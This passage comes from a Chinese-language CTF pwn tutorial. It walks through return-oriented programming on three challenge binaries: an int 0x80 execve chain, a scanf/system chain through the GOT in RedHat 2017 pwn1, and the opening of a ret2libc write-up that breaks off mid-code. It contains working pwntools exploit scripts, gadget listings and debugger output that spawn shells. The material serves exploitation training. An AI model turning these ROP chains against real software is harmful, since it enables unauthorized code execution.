src="https://i.loli.net/2018/10/25/5bd19cd6d73dd.png"></p><p>找到漏洞之后我们可以构造ROP了，由于这个程序中没有system函数，我们需要找到<code>int 0x80</code>系统中断，可用<code>ROPgadget</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">⚡ root@kali ROPgadget --binary pwn5 | grep <span class="hljs-string">&quot;int 0x80&quot;</span><br>0x08071003 : add byte ptr [eax], al ; int 0x80<br>0x08071001 : add dword ptr [eax], eax ; add byte ptr [eax], al ; int 0x80<br>0x08071005 : int 0x80  //  &lt;=======这里<br>0x08070ffe : invd ; mov eax, 1 ; int 0x80<br>0x0807ed3a : ja 0x807ed40 ; add byte ptr [eax], al ; int 0x80<br>0x080bb0a6 : js 0x80bb0b0 ; int 0x80<br>0x080bb172 : js 0x80bb17b ; int 0x80<br>0x08070ffc : lock or dword ptr [edi], ecx ; or byte ptr [eax + 1], bh ; int 0x80<br>0x0807ed39 : mov eax, 0x77 ; int 0x80<br>0x0807ed30 : mov eax, 0xad ; int 0x80<br>0x08071000 : mov eax, 1 ; int 0x80<br>0x0807398f : nop ; int 0x80<br>0x0807ed2f : nop ; mov eax, 0xad ; int 0x80<br>0x0807398e : nop ; nop ; int 0x80<br>0x0807398c : nop ; nop ; nop ; int 0x80<br>0x0807398a : nop ; nop ; nop ; nop ; int 0x80<br>0x08073988 : nop ; nop ; nop ; nop ; nop ; int 0x80<br>0x0807ed37 : nop ; pop eax ; mov eax, 0x77 ; int 0x80<br>0x08070fff : or byte ptr [eax + 1], bh ; int 0x80<br>0x08070ffd : or dword ptr [edi], ecx ; or byte ptr [eax + 1], bh ; int 0x80<br>0x0807ed38 : pop eax ; mov eax, 0x77 ; int 0x80<br>0x080bb0a7 : push es ; int 0x80<br></code></pre></td></tr></table></figure><p>找到int 8后需要找到执行系统调用的函数，在<a href="http://syscalls.kernelgrok.com/">http://syscalls.kernelgrok.com/ </a>上有详细的参数，我们要调用<a href="http://www.kernel.org/doc/man-pages/online/pages/man2/execve.2.html"><br>sys_execve</a> ：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">execve</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>)<br></code></pre></td></tr></table></figure><ul><li>系统调用号<code>eax</code>应该为<code>0xb</code></li><li>第一个参数<code>ebx</code>应该指向<code>/bin/sh</code>的地址，或者指向<code>sh</code>的地址</li><li>第二个参数<code>ecx</code>应该为0</li><li>第三个参数<code>edx</code>应该为0</li></ul><p>因此我们需要找到控制这几个寄存器的<code>gadget</code>如<code>pop eax ; pop ebx ; pop ecx ; pop edx ; ret</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">⚡ root@kali ROPgadget --binary pwn5 --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | grep <span class="hljs-string">&#x27;eax&#x27;</span> <br>0x08095ff4 : pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret  //&lt;=====<br>0x080a150a : pop eax ; pop ebx ; pop esi ; pop edi ; ret<br>0x080bc396 : pop eax ; ret<br>0x080a1509 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret<br></code></pre></td></tr></table></figure><p>我们可以用这一条<code>0x08095ff4 : pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</code>，</p><p>没有<code>ecx</code>，在找一下<code>pop ecx</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">⚡ root@kali ROPgadget --binary pwn5 --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | grep <span class="hljs-string">&#x27;ecx&#x27;</span><br>0x0804b99a : pop dword ptr [ecx] ; ret<br>0x080733b1 : pop ecx ; pop ebx ; ret //&lt;=====<br>0x080e4325 : pop ecx ; ret<br>0x080733b0 : pop edx ; pop ecx ; pop ebx ; ret<br></code></pre></td></tr></table></figure><p>用这一个：<code>0x080733b1 : pop ecx ; pop ebx ; ret</code></p><p>寻找溢出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">[----------------------------------registers-----------------------------------]<br>EAX: 0x1f <br>EBX: 0x80481b0 (&lt;_init&gt;:push   ebx)<br>ECX: 0x7fffffe1 <br>EDX: 0x80f14d4 --&gt; 0x0 <br>ESI: 0x80f000c --&gt; 0x806a620 (&lt;__strcpy_sse2&gt;:mov    edx,DWORD PTR [esp+0x4])<br>EDI: 0x5e (<span class="hljs-string">&#x27;^&#x27;</span>)<br>EBP: 0x413b4141 (<span class="hljs-string">&#x27;AA;A&#x27;</span>)<br>ESP: 0xffffd130 (<span class="hljs-string">&quot;EAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;</span>)<br>EIP: 0x41412941 (<span class="hljs-string">&#x27;A)AA&#x27;</span>)<br>EFLAGS: 0x10286 (carry PARITY adjust zero SIGN <span class="hljs-built_in">trap</span> INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>Invalid <span class="hljs-variable">$PC</span> address: 0x41412941<br>[------------------------------------stack-------------------------------------]<br>0000| 0xffffd130 (<span class="hljs-string">&quot;EAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;</span>)<br>0004| 0xffffd134 (<span class="hljs-string">&quot;AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;</span>)<br>0008| 0xffffd138 (<span class="hljs-string">&quot;AFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;</span>)<br>0012| 0xffffd13c (<span class="hljs-string">&quot;bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;</span>)<br>0016| 0xffffd140 (<span class="hljs-string">&quot;AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;</span>)<br>0020| 0xffffd144 (<span class="hljs-string">&quot;AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;</span>)<br>0024| 0xffffd148 (<span class="hljs-string">&quot;2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;</span>)<br>0028| 0xffffd14c (<span class="hljs-string">&quot;AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;</span>)<br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>Stopped reason: SIGSEGV<br>0x41412941 <span class="hljs-keyword">in</span> ?? ()<br>gdb-peda$ pattern_offset A)AA<br>A)AA found at offset: 32<br></code></pre></td></tr></table></figure><p>随便找了一个<code>sh</code>，地址为<code>0x80BF5C8</code>：</p><p><img src="https://i.loli.net/2018/10/25/5bd1ab13b260b.png"></p><p>到这里就可以愉快的写脚本了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#coding : utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>io = process(<span class="hljs-string">&quot;./pwn5&quot;</span>)<br><br>sh=<span class="hljs-number">0x080BF5C8</span>         <span class="hljs-comment">#&quot;sh&quot;</span><br>pop1=<span class="hljs-number">0x08095ff4</span>       <span class="hljs-comment">#pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br>pop2=<span class="hljs-number">0x080733b1</span>       <span class="hljs-comment">#pop ecx ; pop ebx ; ret</span><br>int_80=<span class="hljs-number">0x08071005</span>     <span class="hljs-comment">#int 0x80</span><br><br>payload=<span class="hljs-string">&quot;&quot;</span><br>payload+=<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">32</span><br>payload+=p32(pop1)    <span class="hljs-comment">#pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br>payload+=p32(<span class="hljs-number">0xb</span>)<br>payload+=p32(sh)<br>payload+=p32(<span class="hljs-number">0</span>)<br>payload+=p32(<span class="hljs-number">0</span>)<br>payload+=p32(sh)<br>payload+=p32(pop2)    <span class="hljs-comment">#pop ecx ; pop ebx ; ret</span><br>payload+=p32(<span class="hljs-number">0</span>)<br>payload+=p32(sh)<br>payload += p32(int_80)<br><br>io.sendline(<span class="hljs-string">&quot;A&quot;</span>)<br>io.sendline(<span class="hljs-string">&quot;A&quot;</span>)<br>io.sendline(<span class="hljs-string">&quot;A&quot;</span>)<br>io.sendline(<span class="hljs-string">&quot;y&quot;</span>)<br>io.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>运行此脚本时发现并不能成功<code>getshell</code>，猜想是<code>sh</code>字符串的问题，于是尝试换一个方法，向程序输入<code>/bin/sh</code>，找到在<code>bss</code>段的存储位置：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">.bss:<span class="hljs-number">080F</span>1A04                                         ; change_major+<span class="hljs-number">33</span>↑o ...<br>.bss:<span class="hljs-number">080F</span>1A20                 public first_name<br>.bss:<span class="hljs-number">080F</span>1A20 first_name      db    ? ;               ; DATA XREF: print_beginning+<span class="hljs-number">51</span>↑o<br>.bss:<span class="hljs-number">080F</span>1A20                                         ; print_beginning+<span class="hljs-number">66</span>↑o ...<br>.bss:<span class="hljs-number">080F</span>1A21                 db    ? ;<br>.bss:<span class="hljs-number">080F</span>1A22                 db    ? ;<br></code></pre></td></tr></table></figure><p>于是将脚本改为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#coding : utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>io = process(<span class="hljs-string">&quot;./pwn5&quot;</span>)<br><br>bin_sh = <span class="hljs-number">0x080f1a20</span>     <span class="hljs-comment">#&quot;/bin/sh&quot;</span><br>pop1 = <span class="hljs-number">0x08095ff4</span>       <span class="hljs-comment">#pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br>pop2 = <span class="hljs-number">0x080733b1</span>       <span class="hljs-comment">#pop ecx ; pop ebx ; ret</span><br>int_80 = <span class="hljs-number">0x08071005</span>     <span class="hljs-comment">#int 0x80</span><br><br>payload = <span class="hljs-string">&quot;&quot;</span><br>payload += <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">32</span><br>payload += p32(pop1)    <span class="hljs-comment">#pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br>payload += p32(<span class="hljs-number">0xb</span>)<br>payload += p32(bin_sh)<br>payload += p32(<span class="hljs-number">0</span>)<br>payload += p32(<span class="hljs-number">0</span>)<br>payload += p32(bin_sh)<br>payload += p32(pop2)    <span class="hljs-comment">#pop ecx ; pop ebx ; ret</span><br>payload += p32(<span class="hljs-number">0</span>)<br>payload += p32(bin_sh)<br>payload += p32(int_80)<br><br>io.sendline(<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br>io.sendline(<span class="hljs-string">&quot;A&quot;</span>)<br>io.sendline(<span class="hljs-string">&quot;A&quot;</span>)<br>io.sendline(<span class="hljs-string">&quot;y&quot;</span>)<br>io.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><p><code>getshell</code>成功：</p><p><img src="https://i.loli.net/2018/10/25/5bd1b4fd1eaaa.png"></p><p><strong>小结：</strong></p><blockquote><p>调用系统中断来绕过NX的方法总的来说不算难，要能从程序中找到<code>int 0x80</code>并能找到能改变要调用的函数的参数的指令，然后依次传参利用即可🎳</p></blockquote><h2 id="使用Got表中的函数进行ROP"><a href="#使用Got表中的函数进行ROP" class="headerlink" title="使用Got表中的函数进行ROP"></a>使用Got表中的函数进行ROP</h2><p><a href="https://pan.baidu.com/s/12GkumQmMDv-3yayIDfr2Lw">题目下载</a></p><p>这是一道来自<code>RedHat 2017</code>的题目<code>pwn1</code></p><p>使用IDA可以很容易发现此程序的<code>main()</code>函数存在栈溢出，伪C代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+18h] [ebp-28h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;pwn test&quot;</span>);<br>  fflush(<span class="hljs-built_in">stdout</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, &amp;v1);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>程序开启了<code>NX</code>，也就是说我们不能直接把shellcode写到栈中执行，因此向我们找一下获取<code>flag</code>的途径，在IDA中可以看到程序调用了<code>system()</code>函数，另外程序中有<code>scanf()</code>，因此我们可以考虑通过<code>scanf()</code>函数将<code>/bin/sh</code>字符串读取到栈中并通过构造ROP链使得程序执行<code>system(&quot;/bin/sh&quot;)</code>从而<code>get flag</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">.rodata:<span class="hljs-number">08048620</span> s               db <span class="hljs-string">&#x27;pwn test&#x27;</span>,<span class="hljs-number">0</span>         ; DATA XREF: main+<span class="hljs-number">9</span>↑o<br>.rodata:<span class="hljs-number">08048629</span> ; <span class="hljs-type">char</span> format[]<br>.rodata:<span class="hljs-number">08048629</span> format          db <span class="hljs-string">&#x27;%s&#x27;</span>,<span class="hljs-number">0</span>               ; DATA XREF: main+<span class="hljs-number">2</span>A↑o<br>.rodata:<span class="hljs-number">08048629</span>                                         ; main+<span class="hljs-number">3</span>E↑o<br>.rodata:<span class="hljs-number">08048629</span> _rodata         ends<br>.rodata:<span class="hljs-number">08048629</span><br></code></pre></td></tr></table></figure><p><code>scanf()</code>的参数<code>%s</code>的位置为<code>08048629</code></p><p>程序本身并没有可以用来起shell的字符串，因此我们需要通过scanf把&#x2F;bin&#x2F;sh写入到内存页中，但是并不是所有的内存页都能写入，我们可以使用IDA的快捷键ctrl+S查看内存页的情况</p><p><img src="https://i.loli.net/2018/10/29/5bd66176beb5e.png"></p><p>可见在<code>0804A030</code>有一块可读可写且长度足够的空间我们可以把<code>/bin/sh</code>写到这里面</p><p>通过<code>pattern</code>模块可知<code>padding</code>为<code>52</code>，可得脚本如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p=process(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)<br>scanf_addr=p32(elf.symbols[<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>])<br>system_addr=p32(elf.symbols[<span class="hljs-string">&#x27;system&#x27;</span>])<br>baifenhao_s=p32(<span class="hljs-number">0x08048629</span>)<br>binsh_addr=p32(<span class="hljs-number">0x0804A030</span>)<br><br>payload=<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">52</span>         <span class="hljs-comment">#构造padding</span><br>payload+=scanf_addr    <span class="hljs-comment">#覆盖EIP的值为scanf的函数地址</span><br>payload+=baifenhao_s   <span class="hljs-comment">#scanf的第一个参数：%s</span><br>payload+=binsh_addr    <span class="hljs-comment">#scanf的第二个参数：地址</span><br>......              <br></code></pre></td></tr></table></figure><p>这里出现一些问题如果我们直接像上面那样写脚本的话，在<code>EIP</code>指向<code>scanf()</code>的时候，<code>call __isoc99_scanf</code>之后，<code>ret</code>指令会将call指令压入栈中的地址取出给<code>EIP</code>，但是我们向上面那样构造脚本并没有模拟出<code>call</code>指令的压栈操作，因此我们需要把脚本修改一下，在<code>scanf()</code>的地址和<code>scanf()</code>的参数之间加上一个<code>scanf()</code>调用完成之后的返回地址，由于我们需要调用过<code>scanf()</code>之后再调用<code>system()</code>函数，因此我们可以把这个地址修改为<code>main()</code>函数的地址以便于进行第二次栈溢出执行<code>system()</code>函数，示意图如下</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">+----------------+                      +----------------+<br>|   scanf_addr   |                      |   scanf_addr   | <br>+----------------+                      +----------------+<br>|   baifenhao_s  |     ========&gt;        |   main_addr    |<br>+----------------+      修改为：         +----------------+<br>|   binsh_addr   |                      |   baifenhao_s  | <br>+----------------+                      +----------------+<br>                                        |   binsh_addr   | <br>                                        +----------------+<br></code></pre></td></tr></table></figure><p><code>main()</code>函数地址为<code>08048531</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">08048531</span> ; =============== S U B R O U T I N E =======================================<br>.text:<span class="hljs-number">08048531</span><br>.text:<span class="hljs-number">08048531</span> ; Attributes: bp-based frame<br>.text:<span class="hljs-number">08048531</span><br>.text:<span class="hljs-number">08048531</span> ; <span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span>, <span class="hljs-type">char</span> **, <span class="hljs-type">char</span> **)</span><br>.text:08048531 main            proc near               ; DATA XREF: start+<span class="hljs-number">17</span>↑o<br>.text:<span class="hljs-number">08048531</span> ; __unwind &#123;<br>.text:<span class="hljs-number">08048531</span>                 push    ebp<br>.text:<span class="hljs-number">08048532</span>                 mov     ebp, esp<br></code></pre></td></tr></table></figure><p>因此脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p=process(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)<br>scanf_addr=p32(elf.symbols[<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>])<br>system_addr=p32(elf.symbols[<span class="hljs-string">&#x27;system&#x27;</span>])<br>main_addr=p32(<span class="hljs-number">0x08048531</span>)<br>baifenhao_s=p32(<span class="hljs-number">0x08048629</span>)<br>binsh_addr=p32(<span class="hljs-number">0x0804A030</span>)<br><br>payload1=<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">52</span>         <span class="hljs-comment">#构造padding</span><br>payload1+=scanf_addr    <span class="hljs-comment">#覆盖EIP的值为scanf的函数地址</span><br>payload1+=main_addr     <span class="hljs-comment">#ret到main()</span><br>payload1+=baifenhao_s   <span class="hljs-comment">#scanf的第一个参数：%s</span><br>payload1+=binsh_addr    <span class="hljs-comment">#scanf的第二个参数：地址</span><br><br>payload2=<span class="hljs-string">&quot;B&quot;</span>*<span class="hljs-number">44</span>         <span class="hljs-comment">#构造padding,ebp-8，所以padding-8</span><br>payload2+=system_addr   <span class="hljs-comment">#覆盖EIP的值为system的函数地址</span><br>payload2+=main_addr     <span class="hljs-comment">#system函数的返回地址，无需考虑，可随意填充</span><br>payload2+=binsh_addr    <span class="hljs-comment">#binsh字符串的地址充当system()函数的参数</span><br>                <br>p.sendline(payload1)<br>p.sendline(<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br>p.sendline(payload2)<br>p.interactive()              <br></code></pre></td></tr></table></figure><p>效果：</p><p><img src="https://i.loli.net/2018/10/29/5bd671a95392d.png"></p><h2 id="ROP之ret2libc"><a href="#ROP之ret2libc" class="headerlink" title="ROP之ret2libc"></a>ROP之ret2libc</h2><p><a href="https://pan.baidu.com/s/1eKszh72gVUGK3IQeS9uzRg">题目下载</a></p><p>有时候题目所给的程序中并没有可以直接拿来用的函数地址或者字符串，但是给了<code>libc</code>文件，这个文件中包含我们能用到的函数，因此我们可以通过计算相应的函数地址在<code>libc</code>中的偏移量来计算出<code>libc</code>映射到程序中的起始地址，进而利用<code>libc</code>中的其他函数</p><p>在<code>Security Fest CTF 2016</code>的<code>tvstation</code>中，主要逻辑如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __noreturn <span class="hljs-title function_">menu</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v0; <span class="hljs-comment">// eax</span><br><br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      print_menu();<br>      v0 = (<span class="hljs-type">char</span>)get_one();<br>      <span class="hljs-keyword">if</span> ( v0 != <span class="hljs-number">50</span> )<br>        <span class="hljs-keyword">break</span>;<br>      user();<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v0 &gt; <span class="hljs-number">50</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v0 == <span class="hljs-number">51</span> )<br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Disconnected!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( v0 == <span class="hljs-number">52</span> )<br>        debug();<br>      <span class="hljs-keyword">else</span><br>LABEL_13:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid option!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v0 != <span class="hljs-number">49</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_13;<br>      uptime();<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里面有一个<code>debug()</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">debug</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">void</span> *v0; <span class="hljs-comment">// ST08_8</span><br>  <span class="hljs-type">size_t</span> v1; <span class="hljs-comment">// rax</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n=== TV Station - Debug Menu ===&quot;</span>);<br>  v0 = dlsym((<span class="hljs-type">void</span> *)<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>LL, <span class="hljs-string">&quot;system&quot;</span>);<br>  <span class="hljs-built_in">sprintf</span>(fmsg, info, v0);<br>  v1 = <span class="hljs-built_in">strlen</span>(fmsg);<br>  write(<span class="hljs-number">1</span>, fmsg, v1);<br>  <span class="hljs-keyword">return</span> 